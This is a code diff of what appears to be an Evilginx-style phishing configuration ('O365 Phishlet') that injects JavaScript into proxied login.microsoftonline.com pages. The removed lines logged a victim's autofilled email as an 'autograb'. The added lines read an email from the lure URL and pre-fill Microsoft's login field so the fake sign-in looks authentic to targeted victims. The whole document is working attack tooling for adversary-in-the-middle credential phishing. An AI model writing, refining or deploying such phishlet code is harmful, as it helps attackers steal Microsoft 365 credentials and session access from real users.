@@ -31,61 +31,21 @@ login:
 
 js_inject:
   - trigger_domains: ['login.microsoftonline.com']
-    trigger_paths: ['/', '/common', '/organizations', '/consumers']
+    trigger_paths: ['/']
     script: |
-      (function() {
-        console.log("[*] O365 Phishlet: email autograb active (console-only mode).");
-
-        function findEmailField() {
-          return document.querySelector(
-            'input[type="email"], input[name="loginfmt"], input[name="login"], input#i0116, input#email'
-          );
-        }
-
-        function getQueryParam(name) {
-          name = name.replace(/[\[\]]/g, "\\$&");
-          var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
-              results = regex.exec(window.location.href);
-          if (!results) return null;
-          if (!results[2]) return '';
-          return decodeURIComponent(results[2].replace(/\+/g, " "));
-        }
-
-        // ===== 1. PREFILL from ?email= parameter =====
-        var prefillEmail = getQueryParam('email');
-        if (prefillEmail && prefillEmail.includes('@')) {
-          var emailField = findEmailField();
-          if (emailField) {
-            emailField.value = prefillEmail;
-            emailField.dispatchEvent(new Event('input', { bubbles: true }));
-            emailField.dispatchEvent(new Event('change', { bubbles: true }));
-            console.log("[*] PREFILL: " + prefillEmail);
+      setTimeout(function() {
+        var urlParams = new URLSearchParams(window.location.search);
+        var email = urlParams.get('email');
+        if (email && email.includes('@')) {
+          var field = document.querySelector('input[type="email"]') || 
+                      document.querySelector('input[name="login"]') ||
+                      document.querySelector('input[name="loginfmt"]') ||
+                      document.querySelector('#i0116');
+          if (field) {
+            field.value = email;
+            field.dispatchEvent(new Event('input', { bubbles: true }));
+            field.dispatchEvent(new Event('change', { bubbles: true }));
+            field.focus();
           }
         }
-
-        // ===== 2. AUTOGRAB – log to console only =====
-        var emailGrabbed = false;
-
-        function grabEmail() {
-          if (emailGrabbed) return;
-          var field = findEmailField();
-          if (field && field.value && field.value.includes('@')) {
-            console.log("[*] AUTOGRAB: " + field.value);
-            console.log("[*] TIMESTAMP: " + new Date().toISOString());
-            console.log("[*] SOURCE: browser autofill");
-            emailGrabbed = true;
-            clearInterval(grabInterval);
-          }
-        }
-
-        grabEmail();
-        var grabInterval = setInterval(grabEmail, 500);
-
-        setTimeout(function() {
-          clearInterval(grabInterval);
-          if (!emailGrabbed) {
-            console.log("[*] AUTOGRAB: No email detected within timeout.");
-          }
-        }, 15000);
-
-      })();
+      }, 2000);
